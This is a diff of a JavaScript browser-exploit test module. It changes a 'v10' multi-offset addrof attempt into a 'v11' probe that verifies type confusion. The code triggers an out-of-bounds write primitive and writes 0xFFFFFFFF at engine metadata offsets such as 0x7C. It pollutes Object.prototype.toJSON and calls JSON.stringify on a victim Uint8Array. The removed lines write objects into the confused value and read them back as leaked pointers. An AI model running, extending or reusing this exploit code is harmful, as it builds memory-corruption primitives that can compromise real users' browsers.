@@ -1,7 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v10_MultiOffsetCorruption)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v11_VerifyGlobalProbeDetailsCapture)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
+import { AdvancedInt64, toHex } from '../utils.mjs'; // AdvancedInt64 não usado aqui, mas mantido por consistência
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
@@ -9,63 +9,37 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC = "OriginalHeisenbug_TypedArrayAddrof_v10_MultiOffsetCorruption";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC = "OriginalHeisenbug_TypedArrayAddrof_v11_VerifyGlobalProbeDetailsCapture";
 
 const VICTIM_BUFFER_SIZE = 256;
-// const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Agora será um array
-const OOB_WRITE_VALUE = 0xFFFFFFFF; // Valor a ser escrito
+const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // Usaremos apenas este offset para simplificar
+const OOB_WRITE_VALUE = 0xFFFFFFFF;
 
-// Array de offsets para testar a corrupção OOB
-const OOB_TARGET_OFFSETS_V10 = [
-    0x7C, // Original, HEISENBUG_OOB_DATAVIEW_METADATA_BASE (0x58) + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET (0x24)
-    0x70, // Se 0x58 fosse ArrayBufferView, este seria M_LENGTH_OFFSET (0x58 + 0x18)
-    0x68, // Se 0x58 fosse ArrayBufferView, este seria M_VECTOR_OFFSET (0x58 + 0x10)
-    0x78, // Um pouco antes de 0x7C
-    0x74  // Um pouco antes de 0x78, e M_MODE_OFFSET se 0x58 for ABV (0x58 + 0x1C)
-];
+let last_probe_call_details_v11 = null; 
+// object_to_leak_A/B não são necessários para este teste de logging
+let victim_typed_array_ref_v11 = null;
 
-
-let last_probe_call_details_v10 = null; 
-let object_to_leak_A_v10 = null;
-let object_to_leak_B_v10 = null;
-let victim_typed_array_ref_v10 = null;
-
-function toJSON_TA_Probe_MultiOffsetCorruption() {
+function toJSON_TA_Probe_VerifyGlobalDetails() {
     let current_call_details = {
-        probe_variant: "TA_Probe_Addrof_v10_MultiOffsetCorruption",
+        probe_variant: "TA_Probe_Addrof_v11_VerifyGlobalProbeDetailsCapture",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: true,
-        this_was_victim_ref_when_confused: null,
-        writes_attempted_on_confused_this: false
+        this_was_victim_ref: false, // Simplificado: apenas se this === victim
     };
 
     try {
         current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
+        current_call_details.this_was_victim_ref = (this === victim_typed_array_ref_v11);
         
-        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v10? ${this === victim_typed_array_ref_v10}`, "leak");
+        logS3(`[${current_call_details.probe_variant}] Sonda INVOCADA. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref_v11? ${current_call_details.this_was_victim_ref}`, "leak");
 
         if (current_call_details.this_type_in_toJSON === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTED for 'this' (now [object Object])!`, "vuln");
-            
-            current_call_details.this_was_victim_ref_when_confused = (this === victim_typed_array_ref_v10);
-            logS3(`[${current_call_details.probe_variant}] At confusion, 'this' === victim_typed_array_ref_v10? ${current_call_details.this_was_victim_ref_when_confused}`, "info");
-
-            logS3(`[${current_call_details.probe_variant}] Attempting addrof writes on the confused 'this' ([object Object])...`, "warn");
-            if (object_to_leak_A_v10) {
-                this[0] = object_to_leak_A_v10; // Continua escrevendo no 'this' confuso
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_A_v10 to this[0].`, "info");
-            }
-            if (object_to_leak_B_v10) {
-                this[1] = object_to_leak_B_v10;
-                logS3(`[${current_call_details.probe_variant}] Wrote object_to_leak_B_v10 to this[1].`, "info");
-            }
-            current_call_details.writes_attempted_on_confused_this = true;
-
-        } else if (this === victim_typed_array_ref_v10) {
-            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v10, type is ${current_call_details.this_type_in_toJSON}. No confusion for this 'this' in this call.`, "info");
+        } else if (current_call_details.this_was_victim_ref) {
+            logS3(`[${current_call_details.probe_variant}] 'this' is victim_typed_array_ref_v11, type is ${current_call_details.this_type_in_toJSON}.`, "info");
         } else {
-            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v10. No action.`, "warn");
+            logS3(`[${current_call_details.probe_variant}] 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim_typed_array_ref_v11.`, "warn");
         }
 
     } catch (e) {
@@ -73,160 +47,123 @@ function toJSON_TA_Probe_MultiOffsetCorruption() {
         logS3(`[${current_call_details.probe_variant}] ERROR in probe: ${e.name} - ${e.message}`, "error");
     }
     
-    last_probe_call_details_v10 = { ...current_call_details }; 
-    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v10' updated. Returning undefined.`, "dev_verbose");
+    // Atualiza a variável global com os detalhes desta chamada.
+    // Esta é a linha crítica para verificar.
+    last_probe_call_details_v11 = { ...current_call_details }; 
+    logS3(`[${current_call_details.probe_variant}] Probe FINISHING. Global 'last_probe_call_details_v11' updated to: ${JSON.stringify(last_probe_call_details_v11)}`, "dev_verbose");
 
-    return undefined;
+    return undefined; // Crucial: não retornar o objeto de detalhes.
 }
 
-export async function executeTypedArrayVictimAddrofTest_MultiOffsetCorruption() {
-    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}`;
-    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (MultiOffsetCorruption) & Addrof Attempt ---`, "test", FNAME_CURRENT_TEST_BASE);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC} Init...`;
+export async function executeTypedArrayVictimAddrofTest_VerifyGlobalProbeDetailsCapture() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}.triggerAndVerify`;
+    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Verifying Global Probe Detail Capture ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC} Init...`;
 
-    let overall_results = [];
-    let main_error_occurred = null;
+    last_probe_call_details_v11 = null; // Reset global
+    victim_typed_array_ref_v11 = null; 
 
-    for (const current_oob_target_offset of OOB_TARGET_OFFSETS_V10) {
-        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Offset_${toHex(current_oob_target_offset)}`;
-        logS3(`\n===== ITERATION: Testing OOB Target Offset: ${toHex(current_oob_target_offset)} =====`, "subtest", FNAME_CURRENT_ITERATION);
+    let mainErrorOccurred = null;
+    let stringifyOutput = null;
+    let captured_probe_details_after_stringify = null;
+    let heisenbugConfirmedByCapturedDetails = false;
+    
+    const fillPattern = 0.11122233344455; // Apenas para o buffer, não usado para addrof aqui
 
-        last_probe_call_details_v10 = null;
-        victim_typed_array_ref_v10 = null; 
-        object_to_leak_A_v10 = { marker: `ObjA_TA_v10_${toHex(current_oob_target_offset)}`, id: Date.now() }; 
-        object_to_leak_B_v10 = { marker: `ObjB_TA_v10_${toHex(current_oob_target_offset)}`, id: Date.now() + Math.floor(Math.random() * 1000) };
+    try {
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
+            throw new Error("OOB Init failed or oob_write_absolute not available.");
+        }
+        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
 
-        let iterationError = null;
-        let stringifyOutput = null;
-        let captured_probe_details_for_iteration = null;
+        logS3(`STEP 1: Writing CRITICAL value ${toHex(OOB_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
+        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
+        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
         
-        let addrof_result_A = { success: false, message: "Not attempted or Heisenbug/write failed." };
-        let addrof_result_B = { success: false, message: "Not attempted or Heisenbug/write failed." };
+        await PAUSE_S3(100);
+
+        victim_typed_array_ref_v11 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
+        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v11.buffer); 
+        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
+            float64_view_on_underlying_ab[i] = fillPattern + i;
+        }
+
+        logS3(`STEP 2: victim_typed_array_ref_v11 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
+        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v11 with ${toJSON_TA_Probe_VerifyGlobalDetails.name}...`, "test", FNAME_CURRENT_TEST);
         
-        const fillPattern = 0.50505050505050;
+        const ppKey = 'toJSON';
+        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
+        let pollutionApplied = false;
 
         try {
-            await triggerOOB_primitive({ force_reinit: true }); // Reinit OOB for each offset to ensure clean state
-            if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
-                throw new Error("OOB Init failed or oob_write_absolute not available.");
-            }
-            logS3("OOB Environment initialized for iteration.", "info", FNAME_CURRENT_ITERATION);
+            Object.defineProperty(Object.prototype, ppKey, {
+                value: toJSON_TA_Probe_VerifyGlobalDetails,
+                writable: true, configurable: true, enumerable: false
+            });
+            pollutionApplied = true;
+            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`STEP 1: Writing CRITICAL value ${toHex(OOB_WRITE_VALUE)} to oob_array_buffer_real[${toHex(current_oob_target_offset)}]...`, "warn", FNAME_CURRENT_ITERATION);
-            oob_write_absolute(current_oob_target_offset, OOB_WRITE_VALUE, 4);
-            logS3(`  Critical OOB write to ${toHex(current_oob_target_offset)} performed.`, "info", FNAME_CURRENT_ITERATION);
+            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v11)...`, "warn", FNAME_CURRENT_TEST);
+            stringifyOutput = JSON.stringify(victim_typed_array_ref_v11); 
             
-            await PAUSE_S3(100);
-
-            victim_typed_array_ref_v10 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
-            let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v10.buffer); 
+            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + (stringifyOutput.length > 100 ? "..." : "") : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             
-            for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
-                float64_view_on_underlying_ab[i] = fillPattern + i;
+            // Captura e loga o estado da variável global APÓS stringify
+            if (last_probe_call_details_v11) {
+                captured_probe_details_after_stringify = { ...last_probe_call_details_v11 }; 
             }
+            logS3(`  Captured last_probe_call_details_v11 state AFTER stringify: ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'null (probe likely not called or error)'}`, "leak", FNAME_CURRENT_TEST);
 
-            logS3(`STEP 2: victim_typed_array_ref_v10 created. View filled.`, "test", FNAME_CURRENT_ITERATION);
-            logS3(`   Attempting JSON.stringify with ${toJSON_TA_Probe_MultiOffsetCorruption.name}...`, "test", FNAME_CURRENT_ITERATION);
-            
-            const ppKey = 'toJSON';
-            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-            let pollutionApplied = false;
-
-            try {
-                Object.defineProperty(Object.prototype, ppKey, {
-                    value: toJSON_TA_Probe_MultiOffsetCorruption,
-                    writable: true, configurable: true, enumerable: false
-                });
-                pollutionApplied = true;
-
-                stringifyOutput = JSON.stringify(victim_typed_array_ref_v10); 
-                
-                if (last_probe_call_details_v10) {
-                    captured_probe_details_for_iteration = { ...last_probe_call_details_v10 }; 
+            if (captured_probe_details_after_stringify && 
+                captured_probe_details_after_stringify.probe_called &&
+                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
+                heisenbugConfirmedByCapturedDetails = true;
+                logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED by captured details! 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+            } else {
+                let msg = "Heisenbug on 'this' of probe NOT confirmed by captured details.";
+                if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
+                    msg += ` 'this' type in last probe: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
+                } else if (!captured_probe_details_after_stringify) {
+                    msg += " Captured last probe details are null.";
                 }
-                logS3(`  Last probe call details for offset ${toHex(current_oob_target_offset)}: ${captured_probe_details_for_iteration ? JSON.stringify(captured_probe_details_for_iteration) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);
-
-                let heisenbugObserved = captured_probe_details_for_iteration?.this_type_in_toJSON === "[object Object]";
-                if (heisenbugObserved) {
-                     logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED for offset ${toHex(current_oob_target_offset)}!`, "vuln", FNAME_CURRENT_ITERATION);
-                } else {
-                    logS3(`  Heisenbug on 'this' of probe NOT confirmed for offset ${toHex(current_oob_target_offset)}. Last type: ${captured_probe_details_for_iteration?.this_type_in_toJSON}`, "warn", FNAME_CURRENT_ITERATION);
-                }
-                    
-                logS3("STEP 3: Checking float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_ITERATION);
-                const val_A = float64_view_on_underlying_ab[0];
-                const val_B = float64_view_on_underlying_ab[1];
-                let temp_int64_A = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
-                let temp_int64_B = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
-
-                addrof_result_A.leaked_address_as_double = val_A;
-                addrof_result_A.leaked_address_as_int64 = temp_int64_A;
-                 if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_int64_A.high() < 0x00020000 || (temp_int64_A.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                    addrof_result_A.success = true;
-                    addrof_result_A.message = `Possible pointer for ObjA at offset ${toHex(current_oob_target_offset)}.`;
-                } else {
-                    addrof_result_A.message = `No pointer for ObjA at offset ${toHex(current_oob_target_offset)}. Value: ${val_A}`;
-                }
-
-                addrof_result_B.leaked_address_as_double = val_B;
-                addrof_result_B.leaked_address_as_int64 = temp_int64_B;
-                if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_int64_B.high() < 0x00020000 || (temp_int64_B.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                    addrof_result_B.success = true;
-                    addrof_result_B.message = `Possible pointer for ObjB at offset ${toHex(current_oob_target_offset)}.`;
-                } else {
-                    addrof_result_B.message = `No pointer for ObjB at offset ${toHex(current_oob_target_offset)}. Value: ${val_B}`;
-                }
-
-            } catch (e_str) {
-                iterationError = e_str;
-                logS3(`    CRITICAL ERROR during stringify/addrof logic for offset ${toHex(current_oob_target_offset)}: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_ITERATION);
-            } finally {
-                if (pollutionApplied) {
-                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false });
-                }
+                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
             }
-        } catch (e_outer) {
-            iterationError = e_outer;
-            logS3(`CRITICAL ERROR in iteration for offset ${toHex(current_oob_target_offset)}: ${e_outer.name} - ${e_outer.message}`, "critical", FNAME_CURRENT_ITERATION);
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}: ${heisenbugConfirmedByCapturedDetails ? "TC Confirmed" : "TC NOT Confirmed"}`;
+
+        } catch (e_str) {
+            mainErrorOccurred = e_str; // Changed from errorCapturedMain to mainErrorOccurred
+            logS3(`    CRITICAL ERROR during JSON.stringify or verification: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC}: Stringify/Verify ERR`;
         } finally {
-            clearOOBEnvironment(); // Limpa para a próxima iteração ou fim do teste
+            if (pollutionApplied) {
+                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
+                else delete Object.prototype[ppKey];
+                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
+            }
+        }
+
+    } catch (e_outer_main) {
+        mainErrorOccurred = e_outer_main; // Changed from errorCapturedMain to mainErrorOccurred
+        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V11_VGPDC} CRITICALLY FAILED`;
+    } finally {
+        clearOOBEnvironment();
+        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
+        logS3(`Heisenbug confirmation by captured details: ${heisenbugConfirmedByCapturedDetails}`, heisenbugConfirmedByCapturedDetails ? "good" : "warn", FNAME_CURRENT_TEST);
+        if (captured_probe_details_after_stringify) {
+             logS3(`Final captured probe details: ${JSON.stringify(captured_probe_details_after_stringify)}`, "leak", FNAME_CURRENT_TEST);
         }
         
-        overall_results.push({
-            offset: toHex(current_oob_target_offset),
-            error: iterationError ? `${iterationError.name}: ${iterationError.message}` : null,
-            stringifyOutput: stringifyOutput ? stringifyOutput.substring(0,100)+"..." : null,
-            probe_details: captured_probe_details_for_iteration,
-            addrof_A: { ...addrof_result_A },
-            addrof_B: { ...addrof_result_B }
-        });
-        
-        if (addrof_result_A.success || addrof_result_B.success) {
-            logS3(`!!!! POTENTIAL ADDROF SUCCESS at offset ${toHex(current_oob_target_offset)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: Addr? ${toHex(current_oob_target_offset)} SUCCESS!`;
-            // Poderia adicionar um 'break;' aqui se quiser parar no primeiro sucesso.
-        }
-        await PAUSE_S3(200); // Pausa entre as iterações de offset
-    } // Fim do loop for (const current_oob_target_offset...)
-
-    // Log final resumido
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
-    overall_results.forEach(res => {
-        logS3(`Offset ${res.offset}: AddrA Success=${res.addrof_A.success}, AddrB Success=${res.addrof_B.success}. Probe type: ${res.probe_details?.this_type_in_toJSON || 'N/A'}. Error: ${res.error || 'None'}`, 
-              (res.addrof_A.success || res.addrof_B.success) ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
-    });
-    
-    // Definir título final com base nos resultados gerais
-    if (!document.title.includes("SUCCESS")) {
-         document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: All Offsets Tested.`;
+        victim_typed_array_ref_v11 = null; 
+        last_probe_call_details_v11 = null; 
     }
-    if (main_error_occurred) { // Se um erro principal ocorreu antes do loop
-         document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V10_MOC}: Main Error!`;
-    }
-
-
     return { 
-        errorOccurred: main_error_occurred, // Erro principal antes/depois do loop (se houver)
-        iteration_results: overall_results
+        errorOccurred: mainErrorOccurred, 
+        potentiallyCrashed: false, 
+        stringifyResult: stringifyOutput, 
+        toJSON_details: captured_probe_details_after_stringify,
+        heisenbug_confirmed_externally: heisenbugConfirmedByCapturedDetails
+        // addrof results removed as not relevant for this specific test
     };
 }
